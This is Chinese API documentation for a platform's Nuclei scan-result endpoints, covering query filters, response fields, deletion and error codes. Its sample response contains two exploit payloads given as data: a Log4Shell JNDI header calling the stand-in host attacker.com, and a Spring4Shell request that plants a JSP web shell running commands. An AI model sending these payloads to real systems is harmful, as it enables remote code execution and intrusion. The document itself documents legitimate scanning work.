# Nuclei扫描结果接口

提供对Nuclei扫描结果的查询和删除功能，支持按不同条件筛选结果记录。

## API概览

| 接口功能     | HTTP方法 | 请求路径                   | 说明                     |
| ------------ | -------- | -------------------------- | ------------------------ |
| 查询扫描结果 | GET      | /api/nuclei_result/        | 获取Nuclei扫描结果列表   |
| 删除扫描结果 | POST     | /api/nuclei_result/delete/ | 删除特定Nuclei扫描结果   |

## 通用字段说明

### 基础查询参数

| 字段名         | 类型     | 是否必填 | 说明                     |
| -------------- | -------- | -------- | ------------------------ |
| template_url   | string   | 否       | 模版文件URL，支持模糊查询 |
| template_id    | string   | 否       | 模版ID，支持模糊查询     |
| vuln_name      | string   | 否       | 漏洞名称，支持模糊查询   |
| vuln_severity  | string   | 否       | 漏洞等级，支持模糊查询   |
| vuln_url       | string   | 否       | 漏洞URL，支持模糊查询    |
| curl_command   | string   | 否       | curl命令，支持模糊查询   |
| target         | string   | 否       | 目标，支持模糊查询       |
| task_id        | string   | 否       | 关联的任务ID             |
| page           | number   | 否       | 页码，默认为1            |
| size           | number   | 否       | 每页记录数，默认为10     |
| order          | string   | 否       | 排序字段，默认为"-_id"，表示按ID倒序排列 |

## 通用响应格式

所有API响应都遵循以下格式：

```json
{
  "code": 200,       // 响应码，200表示成功，非200表示出错
  "message": "success", // 响应消息
  "data": {}       // 响应数据，格式因API而异
}
```

### 通用响应字段说明

| 字段名   | 类型   | 说明                                        |
| -------- | ------ | ------------------------------------------- |
| code     | number | 响应码，200表示成功，非200表示出错          |
| message  | string | 响应消息，成功时为"success"，失败时为错误信息 |
| data     | object | 响应数据，不同API返回的数据结构不同         |

## 详细API说明

### 1. 查询Nuclei扫描结果

**请求方法与地址**：
```
GET /api/nuclei_result/
```

**查询参数**：

通用字段说明中的基础查询参数都可用于过滤Nuclei扫描结果。

**响应示例**：
```json
{
  "code": 200,
  "message": "success",
  "page": 1,
  "size": 10,
  "total": 25,
  "items": [
    {
      "_id": "60f8c2b2e13e4b1e8c8b4567",
      "template_url": "http://example.com/templates/cve-2021-44228.yaml",
      "template_id": "CVE-2021-44228",
      "vuln_name": "Apache Log4j Remote Code Execution",
      "vuln_severity": "critical",
      "vuln_url": "http://example.com/login",
      "curl_command": "curl -X POST http://example.com/login -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' -d 'username=admin&password=admin'",
      "target": "example.com",
      "matcher_name": "log4j-rce",
      "request": "POST /login HTTP/1.1\r\nHost: example.com\r\nX-Api-Version: ${jndi:ldap://attacker.com/a}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nusername=admin&password=admin",
      "response": "HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: text/html\r\n\r\n<html>...</html>",
      "task_id": "60f8c2b2e13e4b1e8c8b1234",
      "create_time": "2023-05-01T08:30:00.000Z"
    },
    {
      "_id": "60f8c2b2e13e4b1e8c8b4568",
      "template_url": "http://example.com/templates/cve-2022-22965.yaml",
      "template_id": "CVE-2022-22965",
      "vuln_name": "Spring Framework RCE",
      "vuln_severity": "high",
      "vuln_url": "http://example.org/actuator",
      "curl_command": "curl http://example.org/actuator?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20int%20a%20%3D%20-1;%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
      "target": "example.org",
      "matcher_name": "spring-rce",
      "request": "GET /actuator?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20int%20a%20%3D%20-1;%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1\r\nHost: example.org\r\n\r\n",
      "response": "HTTP/1.1 200 OK\r\nServer: Apache Tomcat/9.0.58\r\nContent-Type: text/html\r\n\r\n<html>...</html>",
      "task_id": "60f8c2b2e13e4b1e8c8b1234",
      "create_time": "2023-05-01T08:32:00.000Z"
    }
    // ... 更多扫描结果记录
  ],
  "query": {
    "vuln_severity": "critical"
  }
}
```

**响应字段说明**：

| 字段名                 | 类型     | 说明                  |
| ---------------------- | -------- | --------------------- |
| total                  | number   | 符合条件的记录总数    |
| page                   | number   | 当前页码              |
| size                   | number   | 每页记录数            |
| items                  | array    | 扫描结果记录数组      |
| items[].\_id           | string   | 扫描结果记录唯一ID    |
| items[].template_url   | string   | 模版文件URL           |
| items[].template_id    | string   | 模版ID                |
| items[].vuln_name      | string   | 漏洞名称              |
| items[].vuln_severity  | string   | 漏洞等级              |
| items[].vuln_url       | string   | 漏洞URL               |
| items[].curl_command   | string   | curl命令              |
| items[].target         | string   | 目标                  |
| items[].matcher_name   | string   | 匹配器名称            |
| items[].request        | string   | 请求内容              |
| items[].response       | string   | 响应内容              |
| items[].task_id        | string   | 关联任务ID            |
| items[].create_time    | string   | 创建时间，ISO8601格式 |
| query                  | object   | 查询参数              |

### 2. 删除Nuclei扫描结果

**请求方法与地址**：
```
POST /api/nuclei_result/delete/
```

**请求体**：
```json
{
  "_id": ["60f8c2b2e13e4b1e8c8b4567", "60f8c2b2e13e4b1e8c8b4568"]
}
```

**参数说明**：

| 参数名 | 类型      | 是否必填 | 说明                       |
| ------ | --------- | -------- | -------------------------- |
| _id    | string[]  | 是       | 要删除的Nuclei扫描结果ID列表 |

**响应示例**：
```json
{
  "code": 200,
  "message": "success",
  "data": {
    "_id": ["60f8c2b2e13e4b1e8c8b4567", "60f8c2b2e13e4b1e8c8b4568"]
  }
}
```

**响应字段说明**：

| 字段名    | 类型      | 说明                       |
| --------- | --------- | -------------------------- |
| data._id  | string[]  | 成功删除的Nuclei扫描结果ID列表 |

## 错误响应

### 通用错误码

| 错误码 | 描述                | 说明                 |
| ------ | ------------------- | -------------------- |
| 500    | Error               | 系统异常             |
| 401    | NotLogin            | 用户未登录           |
| 400    | InvalidParameter    | 参数无效             |

### 错误响应字段说明

| 字段名      | 类型   | 说明                     |
| ----------- | ------ | ------------------------ |
| code        | number | 错误码                   |
| message     | string | 错误类型描述             |
| data.error  | string | 详细错误信息（可选）     |

### 错误示例
参数无效：
```json
{
  "code": 400,
  "message": "InvalidParameter",
  "data": {
    "error": "扫描结果ID格式错误"
  }
}
```

系统错误：
```json
{
  "code": 500,
  "message": "Error",
  "data": {
    "error": "数据库连接失败"
  }
}
```